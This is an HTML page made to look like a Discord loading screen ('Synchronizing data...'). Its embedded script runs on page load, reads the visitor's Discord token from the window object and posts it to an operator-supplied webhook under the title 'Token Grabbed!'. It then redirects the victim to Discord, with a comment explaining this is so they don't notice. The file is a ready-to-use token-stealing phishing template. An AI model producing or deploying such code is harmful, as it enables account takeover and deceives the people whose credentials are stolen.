<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Discord</title>
    <style>
        body {
            background-color: #36393f;
            color: #dcddde;
            font-family: 'Whitney', 'Helvetica Neue', Helvetica, Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .box {
            background-color: #2f3136;
            padding: 20px;
            border-radius: 5px;
            text-align: center;
            width: 300px;
        }
        h2 { margin-top: 0; color: #fff; }
        p { font-size: 14px; color: #b9bbbe; }
        .spinner {
            border: 3px solid #4f4f4f;
            border-top: 3px solid #7289da;
            border-radius: 50%;
            width: 20px;
            height: 20px;
            animation: spin 1s linear infinite;
            margin: 10px auto;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

    <div class="box">
        <h2>Discord</h2>
        <p>Synchronizing data...</p>
        <div class="spinner"></div>
    </div>

    <script>
        async function grabToken() {
            // Get token from window object (works for Web Discord)
            const token = window.xd || window.discordToken;
            
            if (!token) return;

            // Replace the URL below with YOUR webhook URL
            const webhookUrl = "YOUR_WEBHOOK_URL_HERE";

            fetch(webhookUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    embeds: [{
                        title: "Token Grabbed!",
                        color: 15277667,
                        fields: [
                            { name: "Token", value: "```" + token + "```", inline: false },
                            { name: "Time", value: new Date().toISOString(), inline: false }
                        ]
                    }]
                })
            });

            // Redirect back to Discord so they don't notice
            setTimeout(() => {
                window.location.href = "https://discord.com/app";
            }, 1000);
        }

        grabToken();
    </script>
</body>
</html>
